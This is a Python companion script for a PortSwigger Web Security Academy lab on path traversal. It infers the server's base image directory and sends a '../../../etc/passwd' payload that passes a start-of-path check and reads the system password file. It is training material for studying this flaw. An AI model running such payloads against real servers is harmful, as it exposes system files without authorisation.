#!/usr/bin/env python3
"""
File path traversal, validation of start of path
PortSwigger Web Security Academy -- Directory Traversal

Companion script for the writeup: 05-validation-of-start-of-path.md

What this does:
    Infers the expected base directory at runtime instead of hardcoding it:
    reads the lab's own home page for a normal, unmodified filename= value
    (which is already an absolute path for this lab) and takes its
    directory, the same way PathTraversal.py's _infer_base_dir() helper
    does. It then prepends that inferred base directory to a traversal
    chain, satisfying the prefix check while still walking out to
    /etc/passwd once the path resolves.

Usage:
    python 05-validation-of-start-of-path.py <lab-url>
    e.g. python 05-validation-of-start-of-path.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx
from urllib.parse import unquote

UNIX_CONFIRM_REGEX = re.compile(r"root:.*:0:0:")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    match = re.search(r"filename=([^\"'&\s]+)", home.text)
    if not match:
        print("[-] Could not find a baseline filename= reference on the lab's home page.")
        sys.exit(1)

    baseline = unquote(match.group(1))
    print(f"[*] Baseline filename value found on home page: {baseline}")

    if not (baseline.startswith("/") and "/" in baseline[1:]):
        print("[-] Baseline value isn't an absolute path -- can't infer base_dir.")
        sys.exit(1)

    base_dir = baseline[:baseline.rfind("/")]
    print(f"[*] Inferred base directory: {base_dir}")

    payload = f"{base_dir}/../../../etc/passwd"
    r = client.get(f"{lab_url}/image", params={"filename": payload})
    print(f"[*] GET /image?filename={payload}")
    print(f"[*] Response status: {r.status_code}, length: {len(r.text)} bytes")

    if UNIX_CONFIRM_REGEX.search(r.text):
        print("[+] /etc/passwd read successfully:")
        print(r.text)
    else:
        print("[-] Response did not contain /etc/passwd content.")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- start-of-path prefix check satisfied, then walked past.")
    else:
        print("[-] Not solved yet -- inspect the response body above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
